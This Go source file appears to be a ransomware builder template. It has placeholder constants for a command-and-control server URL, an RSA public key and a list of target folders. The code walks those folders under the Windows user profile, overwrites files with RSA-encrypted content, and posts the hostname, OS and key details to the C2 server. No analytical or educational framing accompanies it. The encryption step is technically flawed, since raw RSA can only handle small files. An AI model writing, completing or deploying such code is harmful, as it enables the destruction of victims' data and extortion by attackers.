package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/pem"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
)

const C2ServerUrl = "__C2_SERVER_URL__"
const PublicKeyPEM = "__PUBLIC_KEY__"
const TargetDirsString = "__TARGET_DIRECTORIES__"

func encryptWithRSA(plainText []byte, pubKey *rsa.PublicKey) ([]byte, error) {
	hash := sha256.New()
	encrypted, err := rsa.EncryptOAEP(hash, rand.Reader, pubKey, plainText, nil)
	if err != nil {
		return nil, err
	}
	return encrypted, nil
}

func parsePublicKey(pemString string) (*rsa.PublicKey, error) {
	block, _ := pem.Decode([]byte(pemString))
	if block == nil {
		return nil, nil
	}
	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		cert, errCert := x509.ParseCertificate(block.Bytes)
		if errCert == nil {
			if pubKey, ok := cert.PublicKey.(*rsa.PublicKey); ok {
				return pubKey, nil
			}
		}
		return nil, err
	}
	return pub.(*rsa.PublicKey), nil
}

func processFiles() {
	userProfile := os.Getenv("USERPROFILE")
	if userProfile == "" {
		userProfile = "C:\\Users\\Default"
	}

	pubKey, err := parsePublicKey(PublicKeyPEM)
	if err != nil || pubKey == nil {
		return
	}

	targetDirectories := strings.Split(TargetDirsString, ",")

	for _, dirName := range targetDirectories {
		dirName = strings.TrimSpace(dirName)
		if dirName == "" {
			continue
		}
		
		targetDir := filepath.Join(userProfile, dirName)
		if _, err := os.Stat(targetDir); err == nil {
			filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}
				
				data, err := os.ReadFile(path)
				if err != nil {
					return nil
				}

				encrypted, err := encryptWithRSA(data, pubKey)
				if err == nil {
					os.WriteFile(path, encrypted, 0644)
				}
				return nil
			})
		}
	}
}

func reportBack() {
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "Unknown-PC"
	}

	data := url.Values{}
	data.Set("hostname", hostname)
	data.Set("ip_address", "192.168.1.100")
	data.Set("os", "Windows")
	data.Set("encryption_key", PublicKeyPEM)
	data.Set("encryption_type", "RSA")
	data.Set("status", "rsa_encrypted")

	resp, err := http.PostForm(C2ServerUrl, data)
	if err == nil {
		resp.Body.Close()
	}
}

func main() {
	processFiles()
	reportBack()
}